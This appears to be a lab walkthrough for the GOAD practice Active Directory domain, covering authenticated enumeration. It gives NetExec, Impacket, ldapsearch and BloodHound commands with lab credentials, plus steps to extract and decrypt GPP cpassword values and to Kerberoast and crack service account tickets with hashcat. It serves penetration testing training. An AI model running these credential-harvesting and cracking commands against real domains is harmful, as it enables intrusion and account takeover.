    GOAD Overview
Authenticated Enumeration

Now that we have obtained valid credentials, we transition from unauthenticated reconnaissance to authenticated enumeration. This phase allows us to query Active Directory with legitimate access, revealing significantly more detailed information about the domain structure, users, groups, computers, and potential attack paths.

With authenticated access, we can perform deep LDAP queries, access file shares with proper permissions, and utilize powerful tools like BloodHound to map the domain's attack surface. This is where we begin to understand the true scope of the environment and identify high-value targets.

Enumerating Domain Users

With valid credentials, we can now query Active Directory for comprehensive user information. This includes account status, group memberships, password policies, and potentially sensitive information stored in user attributes like descriptions or notes.

Enumerating Users with NetExec

NetExec provides efficient enumeration capabilities once we have valid credentials. We can extract user lists, group memberships, and other domain information through authenticated SMB or LDAP queries.

netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --users
netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --groups
netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --loggedon-users

Enumerating Users with Impacket-GetADUsers

Impacket's GetADUsers.py provides another powerful method for extracting user information from Active Directory via LDAP queries.

impacket-GetADUsers -all -dc-ip 10.4.10.11 north.sevenkingdoms.local/samwell.tarly:Heartsbane

Enumerating Users with ldapsearch

For more granular control over our queries, ldapsearch allows us to craft specific LDAP filters to extract exactly the information we need.

ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'north\samwell.tarly' -w 'Heartsbane' -b 'DC=north,DC=sevenkingdoms,DC=local' "(objectClass=user)" sAMAccountName | grep sAMAccountName

Tombstones Users Enumeration

Tombstone objects are deleted Active Directory objects that remain in the database for a specified period (typically 60-180 days). These can contain valuable information about previously existing accounts, including their group memberships and permissions.

ldapsearch -H ldap://winterfell.north.sevenkingdoms.local -D 'north\samwell.tarly' -w 'Heartsbane' -b 'CN=Deleted Objects,DC=north,DC=sevenkingdoms,DC=local' "(objectClass=user)" -x

Enumerating Shares

With valid credentials, we can now access SMB shares that were previously inaccessible. File shares often contain sensitive documents, configuration files, and other valuable data.

Enumerating shares with Netexec

netexec smb winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --shares

Enumerating shares with Impacket-smbclient

Impacket's smbclient.py provides interactive access to SMB shares, allowing us to browse, download, and upload files.

impacket-smbclient north/samwell.tarly:Heartsbane@winterfell.north.sevenkingdoms.local

GPP - Group Policy Preferences

Group Policy Preferences (GPP) is a feature that allows administrators to configure various Windows settings. Historically, these preferences sometimes contained encrypted passwords that could be decrypted by attackers. While modern Windows versions have patched this vulnerability, legacy GPP files may still exist in older environments.

We search for Group Policy Preference XML files in the SYSVOL share, which is accessible to all authenticated domain users:

find /mnt/sysvol -name "*.xml" -exec grep -l "cpassword" {} \;

If found, we can decrypt the passwords using tools like gpp-decrypt:

gpp-decrypt "encrypted_password_here"

Active Directory Integrated DNS Enumeration

Active Directory Integrated DNS zones often contain valuable information about the network topology, including server names, service locations, and even dynamic updates that reveal client systems.

dnsenum --dnsserver 10.4.10.11 north.sevenkingdoms.local
dig @10.4.10.11 -t AXFR north.sevenkingdoms.local

Kerberoasting Attack

Kerberoasting is an attack that targets Service Principal Names (SPNs) in Active Directory. Service accounts often have SPNs configured, and requesting tickets for these accounts provides us with encrypted data that we can attempt to crack offline.

Enumerating Kerberoasting with NetExec

netexec ldap winterfell.north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' --kerberoasting kerberoastable.txt

Enumerating Kerberoasting with Impacket-GetUserSPNs

impacket-GetUserSPNs -request -dc-ip 10.4.10.11 north.sevenkingdoms.local/samwell.tarly:Heartsbane -outputfile kerberoastable.txt

Once we have the tickets, we can crack them offline using Hashcat:

hashcat -m 13100 kerberoastable.txt /usr/share/wordlists/rockyou.txt -O

ADCS Enumeration

Active Directory Certificate Services (ADCS) can provide additional attack vectors. We enumerate certificate templates, authorities, and potential misconfigurations.

Automation

Manual enumeration is time-consuming. We can automate much of this process using tools like BloodHound, which aggregates data from various sources and presents it in an easily digestible graph format.

BloodHound

BloodHound uses graph theory to reveal hidden relationships and attack paths in Active Directory. By collecting data from LDAP and other sources, it helps us identify the shortest path to Domain Admin privileges.

bloodhound-python -d north.sevenkingdoms.local -u samwell.tarly -p 'Heartsbane' -c all -ns 10.4.10.11
